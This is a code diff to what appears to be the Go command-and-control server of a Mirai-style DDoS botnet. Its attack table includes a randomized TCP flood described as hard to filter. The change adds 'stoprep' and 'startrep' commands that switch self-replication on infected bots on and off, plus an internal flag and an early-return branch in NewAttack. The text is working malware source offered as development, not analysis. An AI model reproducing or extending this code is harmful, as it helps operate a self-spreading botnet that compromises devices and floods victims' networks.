@@ -147,6 +147,10 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
         29,
         "number of times to repeat",
     },
+	"internal": FlagInfo {
+		30,
+		"Internal bot control",
+	},
 }
 
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
@@ -215,6 +219,16 @@ var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
         []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
         " 'WRAFLOOD' WRaFlood attackS are a form of network-based attack that aims to overwhelm a target's resources by flooding it with a high volume of seemingly random TCP packets. The use of randomized fields in the packets makes it more challenging for target systems to filter out malicious traffic.",
     },
+    "stoprep": AttackInfo {
+        14,
+        []uint8 { 30 },
+        " stop selfrep on bots",
+    },
+    "startrep": AttackInfo {
+        15,
+        []uint8 {30},
+        " start selfrep on bots",
+    },
 }
 
 func uint8InSlice(a uint8, list []uint8) bool {
@@ -240,10 +254,13 @@ func NewAttack(str string, admin int) (*Attack, error) {
         if !exists {
             return nil, errors.New(fmt.Sprintf("\033[0m%s \033[31mis not a valid attack vector\033[0m", args[0]))
         }
+		if atkInfo.attackFlags[0] == 30 {
+			return atk, nil
+		}
         atk.Type = atkInfo.attackID
         args = args[1:]
     }
-
+	
     if len(args) == 0 {
         return nil, errors.New("\033[31mMust specify prefix/netmask as targets")
     } else {
